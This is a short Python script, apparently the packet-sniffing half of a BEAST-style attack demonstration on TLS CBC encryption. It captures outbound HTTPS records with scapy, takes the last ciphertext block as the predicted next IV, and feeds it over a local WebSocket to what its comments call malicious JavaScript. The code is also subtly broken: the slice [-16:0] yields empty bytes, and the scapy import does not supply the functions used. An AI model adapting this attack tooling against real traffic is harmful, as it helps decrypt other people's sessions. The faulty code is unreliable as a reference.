#!/usr/bin/env python

# This script gets the last TLS block as the next IV and sends it via WebSocket to our malicious JavaScript.
# For the sake of demonstration and easier packet capturing,
# this is intended to be run on the CLIENT, although this should be attacker's work in real cases.

import asyncio
import websockets
from scapy import *

def returniv():
    while True:
        # we are ignoring the fact that one piece of TLS application data might be fragmented
        # across several packets since we are handling small amounts of data here
        sniffResult = sniff(filter="dst port 443", count=1)[0]
        if raw(sniffResult[Raw])[0] != 23:
            continue
        # get the last TLS record that will be used as the next block's IV
        iv = raw(sniffResult[Raw])[-16:0]
        return iv

async def handleSocket(websocket, path):
    while True:
        iv = returniv()
        await websocket.send(iv)

start_server = websockets.serve(handleSocket, "localhost", 8080)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
